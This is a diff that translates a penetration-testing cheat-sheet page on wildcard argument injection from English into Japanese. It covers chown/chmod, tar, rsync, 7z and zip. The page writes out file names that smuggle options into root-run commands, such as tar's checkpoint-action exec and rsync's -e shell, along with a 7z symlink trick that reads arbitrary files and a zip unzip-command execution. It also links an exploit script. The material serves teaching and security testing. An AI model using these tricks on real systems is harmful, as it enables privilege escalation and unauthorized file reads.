@@ -2,71 +2,59 @@
 
 ## chown, chmod
 
-You can **indicate which file owner and permissions you want to copy for the rest of the files**
-
+**どのファイルの所有者と権限を残りのファイルにコピーしたいかを指定できます**
 ```bash
 touch "--reference=/my/own/path/filename"
 ```
-
-You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(combined attack)_\
-More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+この攻撃を利用することができます [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(組み合わせ攻撃)_\
+詳細は [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) を参照してください。
 
 ## Tar
 
-**Execute arbitrary commands:**
-
+**任意のコマンドを実行する:**
 ```bash
 touch "--checkpoint=1"
 touch "--checkpoint-action=exec=sh shell.sh"
 ```
-
-You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar attack)_\
-More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+この方法を利用して攻撃できます [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar攻撃)_\
+詳細は [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) を参照してください。
 
 ## Rsync
 
-**Execute arbitrary commands:**
-
+**任意のコマンドを実行する:**
 ```bash
 Interesting rsync option from manual:
 
- -e, --rsh=COMMAND           specify the remote shell to use
-     --rsync-path=PROGRAM    specify the rsync to run on remote machine
+-e, --rsh=COMMAND           specify the remote shell to use
+--rsync-path=PROGRAM    specify the rsync to run on remote machine
 ```
 
 ```bash
 touch "-e sh shell.sh"
 ```
-
-You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(\_rsync \_attack)_\
-More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+この攻撃は [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(\_rsync \_attack)_ を使用して悪用できます。\
+詳細は [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) を参照してください。
 
 ## 7z
 
-In **7z** even using `--` before `*` (note that `--` means that the following input cannot treated as parameters, so just file paths in this case) you can cause an arbitrary error to read a file, so if a command like the following one is being executed by root:
-
+**7z** では、`--` を `*` の前に使用しても（`--` は次の入力がパラメータとして扱われないことを意味しますので、この場合はファイルパスのみです）、任意のエラーを引き起こしてファイルを読み取ることができます。したがって、次のようなコマンドが root によって実行されている場合：
 ```bash
 7za a /backup/$filename.zip -t7z -snl -p$pass -- *
 ```
-
-And you can create files in the folder were this is being executed, you could create the file `@root.txt` and the file `root.txt` being a **symlink** to the file you want to read:
-
+このコマンドが実行されているフォルダーにファイルを作成できるので、`@root.txt`というファイルと、読みたいファイルへの**シンボリックリンク**である`root.txt`というファイルを作成できます：
 ```bash
 cd /path/to/7z/acting/folder
 touch @root.txt
 ln -s /file/you/want/to/read root.txt
 ```
+その後、**7z** が実行されると、`root.txt` を圧縮すべきファイルのリストを含むファイルとして扱います（それが `@root.txt` の存在が示すことです）そして、7z が `root.txt` を読み込むと、`/file/you/want/to/read` を読み込みます **そしてこのファイルの内容がファイルのリストでないため、エラーをスローします** 内容を表示します。
 
-Then, when **7z** is execute, it will treat `root.txt` as a file containing the list of files it should compress (thats what the existence of `@root.txt` indicates) and when it 7z read `root.txt` it will read `/file/you/want/to/read` and **as the content of this file isn't a list of files, it will throw and error** showing the content.
-
-_More info in Write-ups of the box CTF from HackTheBox._
+_詳細は HackTheBox の CTF ボックスの Write-ups にあります。_
 
 ## Zip
 
-**Execute arbitrary commands:**
-
+**任意のコマンドを実行する:**
 ```bash
 zip name.zip files -T --unzip-command "sh -c whoami"
 ```
-
 {{#include ../../banners/hacktricks-training.md}}
